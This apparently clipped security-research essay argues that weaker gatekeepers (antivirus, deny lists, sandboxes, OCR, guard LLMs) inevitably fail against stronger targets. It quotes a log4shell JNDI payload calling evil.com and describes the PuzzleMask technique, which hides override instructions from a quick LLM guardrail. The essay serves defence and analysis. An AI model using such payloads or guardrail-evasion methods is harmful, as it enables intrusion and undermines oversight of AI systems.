---
title: "30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable"
source: https://research.checkpoint.com/2026/30-years-of-gatekeeper-asymmetry-doom-the-paradox-that-makes-powerful-llms-more-vulnerable/
source_host: research.checkpoint.com
clip_date: 2026-11-19T23:23:21+08:00
trace_id: 57091145-0fab-4e92-b9bf-a033abab7ec7
content_hash: 29ec6300d69ccc78a6d0d01990cc9b846cbbc17b028bb93fee4d515410ecd65d
status: synced
tags: []
series: null
feed_source: Check Point Research
ai_summary: null
ai_summary_style: null
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 41d75244-d011-8163-83b3-f2e958304872
ioc:
  cves:
    - CVE-2021-44228
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

## Abstract

We give an exposition for a principle of *gatekeeper asymmetry doom* in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

## Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle \[1\], the Gatekeeper Asymmetry Doom principle states that:

> If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

## Examples

### Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

### Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database.  
  
If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how [they are not powerful enough to parse HTML](https://stackoverflow.com/a/1732454), they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

### Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task \[2\]\[3\], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update \[4\], \[5\], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

### Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

-   Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.
-   The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing *trusted* adversarial input, then that is very bad, but out of scope for this discussion.
-   The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch `xrewrgfuvhnadfsajkaldsfj.biz`, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks \[6\] to catch Kwyjibo \[7\]. Attackers evolved to use concatenations of randomly generated dictionary words \[8\], \[9\], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

### Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation \[10\] (this is a rather watered-down version fit for the current format):

> Suppose we manage a chatroom and, as \[..\] Digimon fans, we refuse to allow anyone in the chatroom to mention \[anything to do with\] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: `Three weeks ago I went to see the movie 'Detective Pikachu'`, this will show up as `Three weeks ago I went to see the movie 'Detective '`. \[..\]  
>   
> Someone posts `gengar` uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, `Dracaufeu` or `Tortank`, so we add support for foreign languages.  
>   
> Everything goes well until one day someone posts \[a message concerning the Pokémon `Victini`\]. \[Our list\] doesn’t include `Victini`; it’s a new one \[..\] Begrudgingly, we set up a script that scrapes the [Bulbapedia](https://bulbapedia.bulbagarden.net/) database for new characters, Pokémon, and other terms of art. \[..\]  
>   
> At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of `J*gglypuff` and `4lakazam` and `Mew_two`. We \[..\] implement a system that checks input for character similarities and word similarities to \[blocked words\]. Eventually \[the filter censors someone’s actual username for incidentally being a well-known Pokémon character\] and a great outcry pours forth from the community, decrying our \[blanket blocking policy\] \[..\]  
>   
> As we mull this over, to our horror, the next day \[a user appears to be posting messages containing `pikachu`, `pokeball`, etc. with impunity\]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out \[the original, unsanitized messages were `pikapikachuchu`, `pokepokeballball`, etc\]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once `pikachu` was removed, `pikapikachuchu` became simply `pikachu`. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.  
>   
> This works for two weeks, and then the `pikachu` s start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called `CHATSCRIPT`, and people have been sending in `CHATSCRIPT<"pika"+"chu">` …

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle \[11\], \[12\]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with `${jndi:ldap://evil.com/malware}`. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this \[13\]:

![Figure 1: Obfuscated log4shell exploit.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/338427e4922e9186.png)

Figure 1: Obfuscated log4shell exploit.

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing `jndi:ldap`. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit `is_substring_in_dict` the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

### Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty \[14\], \[15\].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game \[16\], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

> Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key \[..\] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

![Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/07875d829fd9a8b5.png)

Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.

That article’s parting words include an ominous thinly veiled apology:

> The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. \[..\]  
>   
> These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays \[..\] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must *inevitably* exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

### “Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer \[17\], \[18\] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we *have* to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

> \[..\] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. \[..\] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as `tesseract`.

![Figure 3: Innocent-seeming image merely making a reasonable request.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5d3e5da0706dc852.png)

Figure 3: Innocent-seeming image merely making a reasonable request.

![Figure 4: Tesseract OCR output on the above image.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a533c84ea6ba23a0.png)

Figure 4: Tesseract OCR output on the above image.

> To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human *incredulity* to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

![Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no one would comply with that…](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/df53bdd384f4c94c.png)

Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no human would comply with that…

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

### PuzzleMask Bypass for AI Guardrails

What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, [the PuzzleMask technique](https://research.checkpoint.com/2026/puzzlemask-abusing-plain-prose-as-a-covert-ai-attack-vector/):

> PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

![Figure 6: Overview of what the PuzzleMask technique is for.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6e04fd9fd2137d87.png)

Figure 6: Overview of the PuzzleMask technique.

To put it more directly:

> In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.  
>   
> \[..\]  
>   
> ‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.  
>   
> ‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can *sort of* show you:

> Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

> \[..\] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. \[19\] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four \[..\]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce [self-assessment](https://safeguards.anthropic.com/2026/self-assessment/), a safety layer where the model acts as its own guardrail.

### Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

> For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that *targets* are algorithms that on an input of length *x* can run for at least *x* ² log(*x* ²) steps, and *gatekeepers* are algorithms that on input of length *x* can run for at most *x* ² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target *T* that will compute the correct classification for every input, but no gatekeeper *G* can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

## Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of *perfect play*, and the world is full of non-perfect play. This might be a good time to quote Frank Lantz’s Donkey Space \[20\]:

> You can look at every game as a problem to be solved. We say a game is solved when we can describe how to play perfectly play from any position. Tic Tac Toe is solved. Connect Four is solved. Checkers is solved. \[..\]  
>   
> But what does it mean to solve Rock Paper Scissors? It’s easy to articulate a strategy which will guarantee that you can’t be beaten, just pick randomly. When I say you “can’t be beaten” I don’t mean you’re guaranteed to win, I mean no-one can have any better strategy, there is no way of playing that will do better against you. But if you enter a RPS tournament and want to win, you should be able to do better than that. You should recognize when you’re up against a drunk dude who only throws Rock and adjust your strategy to take advantage of him. Then, when you’re up against someone throwing pure random you adjust back to random yourself to guarantee at least an even chance of winning.  
>   
> \[..\]  
>   
> This is the situation that Poker is in. It’s easy to imagine a “solved” version of simple forms of poker. And using this perfect strategy you could guarantee that no-one in the world can have an edge on you, no-one can outplay you. But that’s not the actual goal of Poker. \[..\] If you play “perfectly” against a drunk tourist, a fish, a donkey, you are throwing money away. So the real \[..\] problem of poker is this inference problem of recognizing what type of player you are up against and adjusting your play to maximize your edge against their strategy. \[..\]  
>   
> Imagine all the possible strategies you could be up against plotted in a multidimensional space, over here is the “perfect” strategy, unexploitable, there’s nothing you can do against it but play it yourself. But all around it are the vast, diverse spectrum of sub-optimal strategies that people actually use. This is Donkeyspace, and your goal is to place your opponent as accurately as possible at a point in this space, and then maneuver yourself to the point that takes maximal advantage of him.

Now think about this carefully, and think about what most of malware is actually like, and how for instance the god-tier SolarWinds hack dropped consumer grade Cobalt Strike as its payload. Worrying about doom is healthy. Worrying about it to the exclusion of being grounded in the actual threat landscape is counter-productive. If a lot of malware could bypass a mitigation, but doesn’t, that’s still a win.

Worrying about gatekeeper asymmetry in a productive way  
  
• Is this attack surface doomed?  
• If it is:  
◦ Do we have a feasible non-doomed gatekeeper we could pivot to?  
◦ How doomed is it in practice, as opposed to theory? Does the inevitable exploit live in the wild right now, or just in some whitepaper, or not even that? How far off is it?  
◦ How much can we narrow down the window of doom by squeezing the power of the gatekeeper?  
◦ What’s our defense-in-depth plan for when it’s breached?

A lot of this responsibility falls to security vendors, particularly the Sisyphean toil of ‘narrowing down windows of doom’ (see: cleverer static analysis systems, more sandbox evasion hardening). This might be a good place to make a completely honest pitch for the motivation for a security vendor to be “AI first”: LLMs are powerful, in the sense of power that fuels gatekeeper asymmetry. They are vast neural networks that, in some setups, can keep to-do lists and conjure Turing-complete python scripts. Wielded in the right way, they can narrow down the window of doom a lot, in some cases to nothing. It is true that in some contexts an LLM, out of the box, is less powerful than the actual Right Algorithm for the Job, in which case one should at least hand the LLM some integration for invoking the Right Algorithm for the Job.

One way or the other, through the lens of gatekeeper asymmetry doom, we’ve seen one sense in which LLMs act like a normal technology, after all. For all their feats and sophistication, put a weak LLM in charge of guarding a stronger LLM, and doom still emerges, as it did with Log4Shell exploits before, and with malicious binaries before that. We’re left to wonder whether seeing LLMs obey the same laws of infosec physics we’ve always known is comforting or frightening.

## References

\[1\] M. Marlinspike, “The Cryptographic Doom Principle.” \[Online\]. Available: [https://moxie.org/2011/12/13/the-cryptographic-doom-principle.html](https://moxie.org/2011/12/13/the-cryptographic-doom-principle.html)

\[2\] C. Fang et al., “Large Language Models for Code Analysis: Do LLMs Really Do Their Job?,” in Proceedings of the 33rd USENIX Security Symposium (USENIX Security 24), 2024, pp. 829–846.

\[3\] A. Tkachenko, D. Suskevic, and B. Adolphi, “Deconstructing Obfuscation: A Four-Dimensional Framework for Evaluating Large Language Models Assembly Code Deobfuscation Capabilities,” arXiv preprint arXiv:2505.19887, 2025.

\[4\] FireEye, “Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor.” \[Online\]. Available: [https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor](https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor)

\[5\] CrowdStrike Intelligence Team, “SUNSPOT Malware: A Technical Analysis.” \[Online\]. Available: [https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/)

\[6\] B. Herzog, “Gibberish Detection 102,” in *32nd Chaos Communication Congress (32C3)*, 2015.

\[7\] H. Crawford and J. Aycock, “Kwyjibo: Automatic Domain Name Generation,” *Software: Practice and Experience*, 2008.

\[8\] S. Yadav, A. K. K. Reddy, A. N. Reddy, and S. Ranjan, “Detecting Algorithmically Generated Malicious Domain Names,” in Proceedings of the 10th ACM SIGCOMM Conference on Internet Measurement (IMC ’10), 2010, pp. 48–61. doi: 10.1145/1879141.1879148.

\[9\] M. Antonakakis et al., “From Throw-Away Traffic to Bots: Detecting the Rise of DGA-Based Malware,” in Proceedings of the 21st USENIX Security Symposium (USENIX Security ’12), 2012, pp. 491–506. \[Online\]. Available: [https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/antonakakis](https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/antonakakis)

\[10\] B. Herzog, “A First Introduction to System Exploitation.” \[Online\]. Available: [https://github.com/BenH11235/pwnable_writeup/releases/latest/download/a_first_introduction_to_system_exploitation.pdf](https://github.com/BenH11235/pwnable_writeup/releases/latest/download/a_first_introduction_to_system_exploitation.pdf)

\[11\] B. Herzog, “The Laconic Log4Shell FAQ.” \[Online\]. Available: [https://research.checkpoint.com/2021/the-laconic-log4shell-faq/](https://research.checkpoint.com/2021/the-laconic-log4shell-faq/)

\[12\] Cloudflare, “Exploitation of Log4j CVE-2021-44228 before Public Disclosure and Evolution of Evasion and Exfiltration.” \[Online\]. Available: [https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/](https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/)

\[13\] VessOnSecurity, “Obfuscated Log4Shell Exploit Example.” \[Online\]. Available: [https://x.com/VessOnSecurity/status/1470744495251771392](https://x.com/VessOnSecurity/status/1470744495251771392)

\[14\] M. Lindorfer, C. Kolbitsch, and P. M. Comparetti, “Detecting Environment-Sensitive Malware,” in Recent Advances in Intrusion Detection (RAID 2011), in Lecture Notes in Computer Science, vol. 6961. Springer, 2011. doi: 10.1007/978-3-642-23644-0_18.

\[15\] N. Miramirkhani, M. P. Appini, N. Nikiforakis, and M. Polychronakis, “Spotless Sandboxes: Evading Malware Analysis Systems Using Wear-and-Tear Artifacts,” in 2017 IEEE Symposium on Security and Privacy (SP), 2017, pp. 1009–1024. doi: 10.1109/SP.2017.42.

\[16\] B. Herzog, “The Cat and Mouse Game: Exploiting Statistical Weaknesses in Human Interaction Anti-Evasions.” \[Online\]. Available: [https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/](https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/)

